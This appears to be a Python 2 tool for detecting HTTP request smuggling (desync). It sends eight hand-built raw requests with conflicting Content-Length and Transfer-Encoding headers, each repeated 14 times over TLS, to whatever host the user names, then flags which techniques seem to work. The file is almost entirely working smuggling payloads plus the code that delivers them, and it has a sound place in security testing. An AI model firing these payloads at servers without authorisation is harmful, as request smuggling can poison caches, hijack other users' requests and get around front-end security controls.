#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Author: Lionel PRAT - lionel.prat9@gmail.com
# Try to understand HTTP desync attack: https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn
import socket
import ssl
import sys
import json

if len(sys.argv) != 3:
    print("Usage: ./smuggling_test.py host \"METHOD URL\"\n\n")
    print("Example: ./smuggling_test.py www.target.com \"POST /\"\n")
    print("Caution: Not support proxy!")
    sys.exit(0)

# detect phase
nhost = sys.argv[1]
uri = sys.argv[2]
detect = {
    'reqCLCL0': uri + ' HTTP/1.1\r\nHost: ' + nhost + '\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nContent-Length: 6\r\nContent-Length: 7\n\n3\nabc\nQ',
    'reqCLCL1': uri + ' HTTP/1.1\r\nHost: ' + nhost + '\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nContent-Length: 6\r\nContent-Length: 7\n\n0\n\nX',
    'reqTETE0': uri + ' HTTP/1.1\r\nHost: ' + nhost + '\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n3\nabc\nQ',
    'reqTETE1': uri + ' HTTP/1.1\r\nHost: ' + nhost + '\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n0\n\nX',
    'reqTECL0': uri + ' HTTP/1.1\r\nHost: ' + nhost + '\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\n\n3\nabc\nQ',
    'reqTECL1': uri + ' HTTP/1.1\r\nHost: ' + nhost + '\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\n\nX\n\n0\n\nX',
    'reqCLTE0': uri + ' HTTP/1.1\r\nHost: ' + nhost + '\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\n\n3\nabc\nQ',
    'reqCLTE1': uri + ' HTTP/1.1\r\nHost: ' + nhost + '\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\n\n0\n\nX'
}

addr = (nhost, 443)
output = []
for key, value in detect.iteritems():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
    message, resp, error = "", "", ""
    try:
        ss.connect(addr)
        print "Send 15x request: " + str(key)
        for i in range(1, 15):
            ss.send(value)
        datas = ""
        while 1:
            data = ss.recv(1024)
            if not data:
                break
            datas += data
        resp_c = 0
        wait = False
        for line in datas.split('\n'):
            if line.startswith('HTTP/1.1 400 Bad Request'):
                wait = True
            elif line.startswith('HTTP/1.0 400 Bad request'):
                wait = True
            elif line.startswith('HTTP/1.1 '):
                wait = False
                resp_c += 1
            if not wait:
                resp += line + '\n'
        if resp_c > 0:
            message = "Technique " + str(key) + " potentiel work., result:\n"
            print message
            print resp
        else:
            message = "Technique " + str(key) + " not work."
            print message
        ss.close()
        s.close()
        output.append({
            'message': message,
            'response': resp
        })
    # I don't want to use a basic error (Exception) to catch,
    # but I can't run enough tests to get all the possible errors.
    except (Exception, OSError, ssl.SSLError):
        error = "Failed to establish a connection."
        print error
with open('output.json', 'w') as f:
    json.dump(output, f, indent=2)
